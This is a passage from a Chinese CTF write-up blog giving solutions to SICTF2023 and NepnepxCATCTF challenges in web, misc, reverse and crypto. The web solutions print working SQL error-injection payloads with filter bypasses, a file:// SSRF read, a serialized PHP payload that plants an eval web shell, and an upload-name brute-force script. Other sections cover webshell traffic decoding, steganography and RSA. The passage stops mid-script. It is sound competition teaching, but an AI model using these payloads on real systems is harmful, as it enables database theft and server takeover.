src="/mdimg/NepnepxCATCTF/5.png"><br /><img src="/mdimg/NepnepxCATCTF/6.png"><br /><img src="/mdimg/NepnepxCATCTF/7.png"><br><a name="pBbsC"></a></p><h3 id="MeowMeow"><a href="#MeowMeow" class="headerlink" title="MeowMeow"></a>MeowMeow</h3><p>010打开<br /><img src="/mdimg/NepnepxCATCTF/8.png"><br>:::tips<br>CatCTF{CAT_GOES_MEOW}<br>:::<br><a name="znyp0"></a></p><h3 id="Cat-Jump"><a href="#Cat-Jump" class="headerlink" title="Cat_Jump"></a>Cat_Jump</h3><p>010打开检索<br /><img src="/mdimg/NepnepxCATCTF/9.png"><br>:::tips<br>CatCTF{EFI_1sv3ry_funn9}<br>:::<br><a name="AAzOJ"></a></p><h3 id="miao"><a href="#miao" class="headerlink" title="miao~"></a>miao~</h3><p>foremost分离出一个音频<br /><img src="/mdimg/NepnepxCATCTF/10.png"><br />Audacity打开<br /><img src="/mdimg/NepnepxCATCTF/11.png"><br />得到key：CatCTF<br />DeepSound打开<br /><img src="/mdimg/NepnepxCATCTF/12.png"><br /><img src="/mdimg/NepnepxCATCTF/13.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">~呜喵喵喵喵呜呜啊呜啊呜喵呜呜~喵啊喵啊喵啊呜喵呜~~~喵~呜喵啊喵啊喵喵喵呜呜~呜~呜喵呜呜啊啊~呜啊喵啊呜喵呜呜啊~喵~呜呜喵喵~喵喵喵呜呜呜喵~呜喵呜呜啊~呜啊啊喵啊呜喵呜呜喵~喵~呜喵呜~~喵喵喵呜啊呜啊喵呜喵呜呜啊~呜啊啊喵啊呜~啊喵~~喵~呜呜喵喵喵喵喵喵呜啊呜呜~呜喵呜呜~喵~喵啊喵啊呜~~啊啊~喵~呜呜喵喵啊喵喵喵呜呜呜呜~呜喵呜呜~呜啊~啊喵啊呜~~啊啊~喵~呜呜喵喵呜喵喵喵呜啊喵呜喵呜喵呜呜啊呜啊啊啊喵啊呜喵喵呜啊~喵~呜喵呜喵喵喵喵喵呜啊喵喵呜呜喵呜呜~喵~啊啊喵啊呜~~啊啊~喵~呜喵呜~啊喵喵喵呜呜~喵啊呜喵呜呜啊啊呜喵啊喵啊呜~呜~喵~喵~呜呜喵喵喵喵喵喵呜啊喵喵啊呜喵呜呜~呜呜呜啊喵啊呜喵呜啊喵啊 <br></code></pre></td></tr></table></figure><p>兽音解密 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a><br /><img src="/mdimg/NepnepxCATCTF/14.png"><br><a name="FZXy4"></a></p><h3 id="CatchCat"><a href="#CatchCat" class="headerlink" title="CatchCat"></a>CatchCat</h3><p>打开是GPS数据<br /><img src="/mdimg/NepnepxCATCTF/15.png"><br />参考：<a href="https://blog.csdn.net/jwq2011/article/details/53674125">https://blog.csdn.net/jwq2011/article/details/53674125</a><br />GPS路径可视化<br /><img src="/mdimg/NepnepxCATCTF/16.png"><br>:::tips<br>CatCTF{GPS_M1ao}<br>:::<br><a name="TqEz9"></a></p><h3 id="Peekaboo"><a href="#Peekaboo" class="headerlink" title="Peekaboo"></a>Peekaboo</h3><p>一个一个试，试出来是百里玄策</p><p><a name="iX5fH"></a></p><h3 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h3><p>丢linux直接cat flag<br /><img src="/mdimg/NepnepxCATCTF/17.png"><br><a name="Wl3K6"></a></p><h3 id="Nepnep-祝你新年快乐啦！"><a href="#Nepnep-祝你新年快乐啦！" class="headerlink" title="Nepnep 祝你新年快乐啦！"></a>Nepnep 祝你新年快乐啦！</h3><p><img src="/mdimg/NepnepxCATCTF/18.png"></p><p><a name="D7CNc"></a></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><p><a name="unJt8"></a></p><h3 id="The-cat-did-it"><a href="#The-cat-did-it" class="headerlink" title="The cat did it"></a>The cat did it</h3><p><img src="/mdimg/NepnepxCATCTF/19.png"><br /><img src="/mdimg/NepnepxCATCTF/20.png"><br />0~100尝试，必出，结果 0%就出了<br>:::tips<br> CatCTF{<strong>9f1ef07877f9d85a82bd500f408b4814}</strong><br>:::</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SICTF2023 wp</title>
    <link href="/2023/02/09/SICTF2023wp/"/>
    <url>/2023/02/09/SICTF2023wp/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p><img src="/mdimg/sictf/1.png"><br><img src="/mdimg/sictf/2.png"><br><strong>用户名处存在sql注入</strong><br><img src="/mdimg/sictf/3.png"><br>**看源码发现是post参数user和pass    **<br><strong>fuzz一下</strong><br><img src="/mdimg/sictf/4.png"></p><blockquote><p>过滤了union，select，空格，=</p></blockquote><p>；没过滤尝试堆叠注入无果，updatexml没过滤，报错注入<br><code>user=1&#39;/**/and/**/updatexml(1,concat(0x7e,database()),0)#&amp;pass=1</code>      //ctf_db<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database())),0x7e)#&amp;pass=1</code>    //admin<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database())),0x7e)#&amp;pass=1</code>           // Username,Password<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(Username)from/**/admin)),0x7e)#&amp;pass=1</code>    //admin<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(Password)from/**/admin)),0x7e)#&amp;pass=1</code>    // 0909876qwe222<br>登录：<br><img src="/mdimg/sictf/5.png"><br>post：url=1试试<br><img src="/mdimg/sictf/6.png"><br><code>url=file:///var/www/html/x9sd.php</code>读取x9sd.php<br><img src="/mdimg/sictf/7.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">text</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$tmp</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-variable">$tmp</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unserx&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unserx&#x27;</span>]);<br>           <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono?&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>);<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;success&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I need some ???&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化$var<br><img src="/mdimg/sictf/8.png"><br>url编码admin赋值给username<br><code>/x9sd.php?username=%2561%2564%256d%2569%2561&amp;unserx=TzoxOiJhIjoxOntzOjY6IgAqAGNtZCI7czoxNjoiZXZhbCgkX1BPU1RbMV0pOyI7fQ==</code><br><img src="/mdimg/sictf/9.png"><br><img src="/mdimg/sictf/10.png"></p><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p>可以上传php文件，但是要爆破文件名，文件名和时间戳有关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>url = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">100000000</span>, <span class="hljs-number">200000000</span>):<br>    re = url + <span class="hljs-title function_ invoke__">str</span>(i) + <span class="hljs-string">&quot;.php&quot;</span><br>    r = requests.<span class="hljs-title function_ invoke__">post</span>(q)<br>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">404</span>:<br>        a = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">print</span>(re)<br>  <br></code></pre></td></tr></table></figure><p>在本地搭一个环境，在本地和远程上传（尽量快）<br>跑出来文件名就可以连antsward了</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h4 id="签到打卡完成"><a href="#签到打卡完成" class="headerlink" title="签到打卡完成"></a>签到打卡完成</h4><p><img src="/mdimg/sictf/11.png">    </p><blockquote><p>010打开附件找到key：SICTF，平台就是青少年的，公众号直接搜（非预期）</p></blockquote><p><img src="/mdimg/sictf/12.png"><br>预期解：</p><p>用ps改一下亮度</p><p>原图<br><img src="/mdimg/sictf/13.png">    </p><p><strong>QRresearch 扫</strong><br><img src="/mdimg/sictf/14.png"><br><code>[http://weixin.qq.com/r/dS-v9yPE436crWeU93pn](http://weixin.qq.com/r/dS-v9yPE436crWeU93pn)    </code></p><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><img src="/mdimg/sictf/15.png"><br>非预期：</p><blockquote><p>stegsolve打开图片查看颜色通道，发现二维码，扫描                        </p></blockquote><p><img src="/mdimg/sictf/16.png"><br>微信QR有纠错，扫描有几率扫出来<br>预期解：</p><blockquote><p>颜色修复工具：<a href="https://github.com/Byxs20/FrequencyColor">https://github.com/Byxs20/FrequencyColor)</a>)</p></blockquote><p>输入序号1-30<br><img src="/mdimg/sictf/17.png"><br><img src="/mdimg/sictf/18.png"><br><code>SICTF&#123;448e8531-c752-4847-ae7e-0e702a8fb915&#125;</code></p><h4 id="geek-challenge"><a href="#geek-challenge" class="headerlink" title="geek_challenge"></a>geek_challenge</h4><p>计算就完事了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">import pwn<br>X = pwn.<span class="hljs-title function_ invoke__">remote</span>(<span class="hljs-string">&quot;&quot;</span>,)<br><span class="hljs-keyword">while</span> True:<br>   tmp = X.<span class="hljs-title function_ invoke__">recvline</span>()<br>    <span class="hljs-keyword">print</span>(tmp.<span class="hljs-title function_ invoke__">decode</span>())<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;= ?&quot;</span> in tmp:<br>        res = <span class="hljs-keyword">eval</span>(tmp.<span class="hljs-title function_ invoke__">decode</span>()[:-<span class="hljs-number">5</span>])<br>        data = <span class="hljs-title function_ invoke__">str</span>(res).<span class="hljs-title function_ invoke__">encode</span>()<br>        X.<span class="hljs-title function_ invoke__">sendline</span>(data)<br></code></pre></td></tr></table></figure><h4 id="王八树木"><a href="#王八树木" class="headerlink" title="王八树木"></a>王八树木</h4><p>文件16进制逆序<br>树木使用工具还原 附地址<a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a><br><code>FileReverse-Tools.py -i 树木</code><br>得到jpg图片 分理出pass.txt  bandzip 爆破得到123456<br><img src="/mdimg/sictf/19.png"><br>解7z得到<code>SI!!!!!!</code><br>使用SilentEye<br><img src="/mdimg/sictf/20.png"><br>得到 <code>2,1,2</code><br>猫脸变换还原flag.bmp  a=3，b=1成功了 脚本可能有问题<br><img src="/mdimg/sictf/21.png"><br><code>SICTF&#123;a9549c89-d261-4bd7-9643-60874dbd28b8&#125;    </code>                </p><h4 id="EzMisc"><a href="#EzMisc" class="headerlink" title="EzMisc"></a>EzMisc</h4><p>伪加密WinRAR修复就行<br>得到<img src="/mdimg/sictf/22.png"><br><code>Xkey:MI43nQrRjQaFTALBTO4JmNJxjO4VcO4Vy</code><br>随波逐流<br><img src="/mdimg/sictf/23.png"><br><code>ohhhhh~</code>解压7z</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">from PIL import Image<br><br>from base64 import b64encode ,b64decode<br><br>from FLAG import FLAG<br><br>import cv2<br><br>OOO000O0000000OOO =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">OO00000O0O00OOOOO =&#x27;</span>&#x27;<br>O0OO0OO0O0O0OOOO0 =Image .open (OOO000O0000000OOO )<br>O000OOO0O0000OO00 =Image .open (OO00000O0O00OOOOO )<br>OOO0OO0O00OO0O00O =cv2 .imread (<span class="hljs-string">&#x27;&#x27;)</span><br><span class="hljs-string">OO00OOO0OOO000OO0 =OOO0OO0O00OO0O00O .shape [1]</span><br><span class="hljs-string">O0OOO0OOO00OO00OO =OOO0OO0O00OO0O00O .shape [0]</span><br><span class="hljs-string">O0000OOO0O00O00OO =Image .new (&quot;RGB&quot;,(OO00OOO0OOO000OO0 ,O0OOO0OOO00OO00OO ))</span><br><span class="hljs-string">OO00OOOO00O0OOO0O =O0OO0OO0O0O0OOOO0 .convert (&#x27;</span>RGB<span class="hljs-number">&#x27;</span>)<br>O000OOO0O0OO0000O =O000OOO0O0000OO00 .convert (<span class="hljs-string">&#x27;RGB&#x27;</span>)<br><span class="hljs-keyword">for</span> OOO0O0OO000O0O000 in range (OO00OOO0OOO000OO0 ):<br>    <span class="hljs-keyword">for</span> OOOOO0000000O0OOO in range (O0OOO0OOO00OO00OO ):<br>        OO0OO00O0O0000O0O ,OO000O0O00000O0O0 ,OOO0O00OO000O0O00 =OO00OOOO00O0OOO0O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))<br>        OO00OOOO0OOO000OO ,O000OO0O0OO00O0O0 ,O00000OO0OO0O0OOO =O000OOO0O0OO0000O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO00OOOO0OOO000OO =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        O000OO0O0OO00O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO000O0O00000O0O0 =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        O00000OO0OO0O0OOO =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        O0OOO0000OOOOO00O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO0O0OOOOO0O00OO0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        O00O00O00OO0O00O0 =OOO0O00OO000O0O00 ^O00000OO0OO0O0OOO<br>        <span class="hljs-keyword">if</span> (O0OOO0000OOOOO00O ==<span class="hljs-number">0</span> ):<br>            O0OOO0000OOOOO00O =<span class="hljs-number">255</span><br>        <span class="hljs-keyword">if</span> (OO0O0OOOOO0O00OO0 ==<span class="hljs-number">0</span> ):<br>            OO0O0OOOOO0O00OO0 =<span class="hljs-number">255</span><br>        <span class="hljs-keyword">if</span> (O00O00O00OO0O00O0 ==<span class="hljs-number">0</span> ):<br>            O00O00O00OO0O00O0 =<span class="hljs-number">255</span><br>        O0OOO0000OOOOO00O =str (b64encode (str (O0OOO0000OOOOO00O ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        OO0O0OOOOO0O00OO0 =str (b64encode (str (OO0O0OOOOO0O00OO0 ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        O00O00O00OO0O00O0 =str (b64encode (str (O00O00O00OO0O00O0 ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        with open (<span class="hljs-string">&#x27;secret~.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)as file0 :<br>            print (O0OOO0000OOOOO00O [::<span class="hljs-number">-1</span> ],OO0O0OOOOO0O00OO0 [::<span class="hljs-number">-1</span> ],O00O00O00OO0O00O0 [::<span class="hljs-number">-1</span> ],file = file0 )<br><br><br></code></pre></td></tr></table></figure><p><del>偷一下Byxs20✌的jio本</del></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">import cv2<br>import base64<br>import numpy as np<br><br>with <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-string">&quot;secret~.txt&quot;</span>)</span> as f:<br>    data = f.read().splitlines()[:<span class="hljs-number">-2</span>]<br><br>img = []<br><span class="hljs-keyword">for</span> line in data:<br>    bgr = [base64.b64decode(i[::<span class="hljs-number">-1</span>]).decode() <span class="hljs-keyword">for</span> i in line.split(<span class="hljs-string">&quot; &quot;</span>)][::<span class="hljs-number">-1</span>]<br>    img.append(bgr)<br>img = np.<span class="hljs-built_in">array</span>(img, np.uint8)<br><br>dic = &#123;<span class="hljs-number">1</span>: <span class="hljs-number">268780</span>, <span class="hljs-number">2</span>: <span class="hljs-number">134390</span>, <span class="hljs-number">4</span>: <span class="hljs-number">67195</span>, <span class="hljs-number">5</span>: <span class="hljs-number">53756</span>, <span class="hljs-number">10</span>: <span class="hljs-number">26878</span>, <span class="hljs-number">20</span>: <span class="hljs-number">13439</span>, <span class="hljs-number">89</span>: <span class="hljs-number">3020</span>, <span class="hljs-number">151</span>: <span class="hljs-number">1780</span>, <span class="hljs-number">178</span>: <span class="hljs-number">1510</span>, <span class="hljs-number">302</span>: <span class="hljs-number">890</span>, <span class="hljs-number">356</span>: <span class="hljs-number">755</span>, <span class="hljs-number">445</span>: <span class="hljs-number">604</span>, <span class="hljs-number">604</span>: <span class="hljs-number">445</span>, <span class="hljs-number">755</span>: <span class="hljs-number">356</span>, <span class="hljs-number">890</span>: <span class="hljs-number">302</span>, <span class="hljs-number">1510</span>: <span class="hljs-number">178</span>, <span class="hljs-number">1780</span>: <span class="hljs-number">151</span>, <span class="hljs-number">3020</span>: <span class="hljs-number">89</span>, <span class="hljs-number">13439</span>: <span class="hljs-number">20</span>, <span class="hljs-number">26878</span>: <span class="hljs-number">10</span>, <span class="hljs-number">53756</span>: <span class="hljs-number">5</span>, <span class="hljs-number">67195</span>: <span class="hljs-number">4</span>, <span class="hljs-number">134390</span>: <span class="hljs-number">2</span>&#125;<br><span class="hljs-keyword">for</span> height, width in dic.items():<br>    cv2.imwrite(f<span class="hljs-string">&quot;./out/&#123;height&#125;_&#123;width&#125;.png&quot;</span>, img.reshape(height, width, <span class="hljs-number">3</span>))<br><br></code></pre></td></tr></table></figure><p>得到<br><img src="/mdimg/sictf/24.png"><br>一眼丁真小鸟游六花（<del>我不是二次元</del><br>题目说的拼音就是这个了，oursercet解flag.评就行<br><img src="/mdimg/sictf/25.png"><br><code>**SICTF&#123;3d04cd71-5b2d-4bce-abec-a6f2f95c3665&#125;**</code></p><h4 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker"></a>Hacker</h4><p><img src="/mdimg/sictf/26.png"><br>一眼丁真要rabbit解密，那么就是要找key和密文了<br>tshark提取base64<br><img src="/mdimg/sictf/27.png"><br><img src="/mdimg/sictf/28.png"><br>得到key：<code>Gui_1s_shumu</code><br><img src="/mdimg/sictf/29.png"><br>密文<code>U2FsdGVkX19bEN3D8vFeG39VyYXPwle2mMQLh5T1HYiSI1XCx7rJhsDnp9qLpUQByITd05Uu05ZAv0o=</code><br><img src="/mdimg/sictf/30.png"></p><h4 id="hacker2"><a href="#hacker2" class="headerlink" title="hacker2"></a>hacker2</h4><p>题目说明 ：树木不小心把重要的信息放在了自己的shell当中，或许对你的解密会有帮助<br>定位http流<br>冰蝎流量<br>flag格式：SICTF{shell名称_密钥_文本文件中存储的字符串}<br>随便翻，知道shell名字是<code>she1l</code><br><img src="/mdimg/sictf/31.png"><br>在第一个流中找到了key<code>7d7c23e87b47368b</code><br><img src="/mdimg/sictf/32.png"><br>在这个流中解出了关键信息字符串<br><code>uU7xO0V/KGySO6rdSlEw/dQXFklZWZn1EMhiAAoH7WNpJcvkV3JcvqHelZOOHVA0YKUdylNKNgf4+x+WrC/GkA==</code><br><img src="/mdimg/sictf/33.png"><br><code>c0rRect!!!</code><br>SICTF{she1l_7d7c23e87b47368b_c0rRect!!!}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h4 id="Ascii"><a href="#Ascii" class="headerlink" title="Ascii"></a>Ascii</h4><p>稍微改下脚本，循环异或3，然后base解密<br><img src="/mdimg/sictf/34.png">            </p><h4 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br>m=libnum.s2n(flag)<br>n=getPrime(<span class="hljs-number">16</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">233</span>):<br>    n*=getPrime(<span class="hljs-number">16</span>)<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492</span><br><span class="hljs-string">157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>一眼丁真，跟bugku的一题几乎一样:<a href="https://ctf.bugku.com/challenges/detail/id/214.html">https://ctf.bugku.com/challenges/detail/id/214.html</a><br>n由多个质因子生成，用sage的euler_phi(n)函数求欧拉函数<br><img src="/mdimg/sictf/35.png"><br>求出phi就是普通解RSA了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Unit.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173</span><br>c = <span 